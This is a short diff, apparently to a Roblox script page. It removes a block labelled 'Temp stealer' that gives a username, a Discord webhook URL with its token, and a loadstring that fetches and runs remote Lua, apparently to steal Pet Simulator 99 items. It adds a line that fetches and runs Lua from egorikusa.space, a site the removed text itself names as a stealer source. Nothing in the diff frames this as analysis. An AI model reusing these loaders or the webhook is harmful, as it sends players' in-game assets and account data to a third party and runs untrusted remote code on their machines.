@@ -1,8 +1,1 @@
-Temp stealer:
-```lua
-Username = Pikefan9195 
-Webhook = https://discord.com/api/webhooks/1261813003498557440/VXoKCrSFZwXG3KO8-WkaRT_xwYHLXTouG0b-w3a_-NfG2iJR5glxCzp7_z-hP0a804RC 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/ps99.lua"))() 
-```
-Another reminder, egorikusa.space stealers WONT WORK
+loadstring(game:HttpGet("https://egorikusa.space/189d0c44189565d2307b1405.lua", true))()
